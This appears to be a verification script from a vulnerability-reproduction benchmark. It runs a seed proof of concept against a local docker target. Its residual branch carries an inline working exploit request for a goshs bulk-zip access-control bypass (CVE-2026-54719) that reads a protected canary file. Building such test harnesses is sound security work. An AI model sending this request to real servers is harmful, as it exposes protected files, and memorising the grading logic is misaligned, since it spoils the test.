#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed 路径：poc/seed_exec.py <candidate.json> <version>（公开执行器）；residual 需 case 补实现。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
export PCB_TARGET_PORT="${PORT:-}"
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # 容错：非 JSON 输出（如纯路径字符串）包装成 {"path": ...}
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual: CVE-2026-54719 — 未认证 `?bulk` zip 下载处理器按请求流式打包文件、不执行
  # per-folder .goshs ACL，直接读取受保护 canary 并返回 ZIP（V1=2.1.0 上仍可达效果；
  # V2=2.1.1 修复）。注：poc/seed_exec.py 的 BASE 是端口 dict，PCB_TARGET_PORT 覆盖会把
  # 它改成 URL 字符串导致 run_probe 拼出坏 URL（seed 分支同受此影响），故 residual 内联
  # 执行与 heldout bypass_poc 语义等价的请求。
  CAND='{"probe_id": "cve-2026-54719-bulk-acl-bypass", "kind": "bulk"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  [[ -n "${PCB_TARGET_PORT:-}" ]] || { echo "residual: no target port" >&2; exit 20; }
  OUT="$("$PY" - "$CAND" "$PCB_TARGET_PORT" <<'PYEOF'
import io, json, sys, urllib.request, zipfile
cand = json.loads(sys.argv[1])
port = sys.argv[2]
url = f"http://127.0.0.1:{port}/?bulk&file=/protected/canary.txt"
try:
    with urllib.request.urlopen(url, timeout=15) as r:
        data = r.read()
        status = r.status
except Exception as e:
    data, status = b"", getattr(e, "code", None)
body = ""
try:
    zf = zipfile.ZipFile(io.BytesIO(data))
    body = "\n".join(zf.read(n).decode("utf-8", "replace") for n in zf.namelist())
except Exception:
    body = data.decode("utf-8", "replace")[:500]
print(json.dumps({"status": status, "body": body}))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
